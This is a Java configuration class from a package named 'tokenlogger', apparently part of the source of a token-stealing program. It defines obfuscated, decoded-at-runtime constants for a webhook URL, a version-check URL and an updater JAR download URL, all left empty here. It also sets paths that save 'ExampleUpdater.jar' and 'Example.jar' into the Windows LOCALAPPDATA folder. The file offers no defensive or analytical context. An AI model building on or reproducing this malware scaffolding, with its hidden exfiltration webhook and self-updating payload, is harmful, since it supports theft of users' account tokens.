package tokenlogger.config;

import static tokenlogger.utils.Decryptor.decode;

public class Config {
    public static final String WEBHOOK_URL = decode("");
    public static final String VERSION_INFO_URL = decode("");
    public static final String UPDATER_JAR_URL = decode("");
    public static final String UPDATER_SAVE_PATH = System.getenv("LOCALAPPDATA") + "\\ExampleUpdater.jar";;
    public static final String APP_SAVE_PATH = System.getenv("LOCALAPPDATA") + "\\Example.jar";;
    public static final int VERSION_NUMBER = 1;
}
